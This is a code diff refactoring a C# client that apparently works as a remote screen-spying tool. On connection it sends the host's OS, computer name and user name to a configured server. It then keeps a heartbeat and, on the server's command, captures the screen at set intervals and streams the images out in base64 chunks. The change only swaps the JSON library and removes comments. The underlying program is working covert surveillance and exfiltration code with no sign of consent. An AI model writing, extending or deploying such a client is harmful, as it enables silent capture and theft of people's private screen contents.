@@ -1,7 +1,7 @@
 using System;
 using System.Net.Sockets;
 using System.Text;
-using Newtonsoft.Json;
+using System.Web.Script.Serialization;
 using System.Timers;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -19,16 +19,13 @@ class Program
     static System.Timers.Timer screenshotTimer;
     static Queue<string> screenshotChunks = new Queue<string>();
     static int bufferSize = 1024 * 5;
-    static bool isSendingScreenshot = false;  // Flag to control screenshot sending
+    static bool isSendingScreenshot = false;
 
     static void Main(string[] args)
     {
-        string server = Server;
-        int port = Port;
-
         try
         {
-            client = new TcpClient(server, port);
+            client = new TcpClient(Server, Port);
             stream = client.GetStream();
 
             SendInfo();
@@ -37,23 +34,23 @@ class Program
             {
                 byte[] data = new byte[bufferSize];
                 int bytes = stream.Read(data, 0, data.Length);
-                if (bytes == 0) break; // Server has closed connection
+                if (bytes == 0) break;
                 string responseData = Encoding.UTF8.GetString(data, 0, bytes);
-                dynamic responseJson = JsonConvert.DeserializeObject(responseData);
+                dynamic responseJson = new JavaScriptSerializer().Deserialize<dynamic>(responseData);
 
-                if (responseJson.type == "message")
+                if (responseJson["type"] == "message")
                 {
-                    Console.WriteLine("Received: {0}", responseJson.text);
+                    Console.WriteLine("Received: {0}", responseJson["text"]);
                 }
-                else if (responseJson.type == "heartbeat")
+                else if (responseJson["type"] == "heartbeat")
                 {
                     SendHeartbeatResponse();
                 }
-                else if (responseJson.type == "set_interval")
+                else if (responseJson["type"] == "set_interval")
                 {
-                    SetIntervalAndStartSendingScreenshots((int)responseJson.interval);
+                    SetIntervalAndStartSendingScreenshots((int)responseJson["interval"]);
                 }
-                else if (responseJson.type == "stop_screenshots")
+                else if (responseJson["type"] == "stop_screenshots")
                 {
                     StopSendingScreenshots();
                 }
@@ -87,23 +84,21 @@ class Program
         string pc = GetPC();
         string user = GetUser();
 
-        string jsonOSInfo = JsonConvert.SerializeObject(new {
+        var jsonOSInfo = new {
             type = "info",
             os = osInfo.Item1 + " " + osInfo.Item2,
             pc = pc,
             user = user
-        });
-        byte[] data = Encoding.UTF8.GetBytes(jsonOSInfo);
-        stream.Write(data, 0, data.Length);
+        };
+        SendJson(jsonOSInfo);
     }
     static void SendMessage(string message)
     {
-        string jsonMessage = JsonConvert.SerializeObject(new {
+        var jsonMessage = new {
             type = "message",
             text = message
-        });
-        byte[] data = Encoding.UTF8.GetBytes(jsonMessage);
-        stream.Write(data, 0, data.Length);
+        };
+        SendJson(jsonMessage);
     }
     static void SendHeartbeatResponse()
     {
@@ -112,9 +107,7 @@ class Program
             type = "heartbeat",
             text = "pong"
         };
-        string jsonHeartbeatResponse = JsonConvert.SerializeObject(heartbeatResponse);
-        byte[] heartbeatResponseBytes = Encoding.UTF8.GetBytes(jsonHeartbeatResponse);
-        stream.Write(heartbeatResponseBytes, 0, heartbeatResponseBytes.Length);
+        SendJson(heartbeatResponse);
     }
     static void SetIntervalAndStartSendingScreenshots(int interval)
     {
@@ -138,11 +131,11 @@ class Program
             return;
 
         isSendingScreenshot = true;
-        screenshotChunks.Clear();  // Clear the queue before adding new chunks
+        screenshotChunks.Clear();
 
         var screenshot = CaptureScreen();
         string base64Screenshot = Convert.ToBase64String(screenshot);
-        int chunkSize = CalculateMaxChunkSize();  // Dynamically calculate the chunk size
+        int chunkSize = CalculateMaxChunkSize();
 
         for (int i = 0; i < base64Screenshot.Length; i += chunkSize)
         {
@@ -159,10 +152,10 @@ class Program
             data = "",
             final = false
         };
-        string emptyJson = JsonConvert.SerializeObject(sampleMessage);
+        string emptyJson = new JavaScriptSerializer().Serialize(sampleMessage);
         int jsonOverhead = Encoding.UTF8.GetByteCount(emptyJson);
-        int maxDataSize = bufferSize - jsonOverhead;  // Buffer limit minus JSON overhead
-        return maxDataSize * 3 / 4;  // Base64 encodes 3 bytes into 4 characters, hence multiply by 3/4 to get byte count
+        int maxDataSize = bufferSize - jsonOverhead;
+        return maxDataSize * 3 / 4;
     }
     static void SendNextScreenshotChunk()
     {
@@ -176,9 +169,7 @@ class Program
                 data = chunk,
                 final = isFinal
             };
-            string jsonScreenshotMessage = JsonConvert.SerializeObject(screenshotMessage);
-            byte[] screenshotData = Encoding.UTF8.GetBytes(jsonScreenshotMessage);
-            stream.Write(screenshotData, 0, screenshotData.Length);
+            SendJson(screenshotMessage);
 
             if (!isFinal)
             {
@@ -186,7 +177,7 @@ class Program
             }
             else
             {
-                isSendingScreenshot = false;  // Reset the flag when the last chunk is sent
+                isSendingScreenshot = false;
             }
         }
     }
@@ -200,5 +191,11 @@ class Program
             bitmap.Save(memoryStream, ImageFormat.Jpeg);
             return memoryStream.ToArray();
         }
+    }
+    static void SendJson(object jsonObject)
+    {
+        string jsonString = new JavaScriptSerializer().Serialize(jsonObject);
+        byte[] data = Encoding.UTF8.GetBytes(jsonString);
+        stream.Write(data, 0, data.Length);
     }
 }
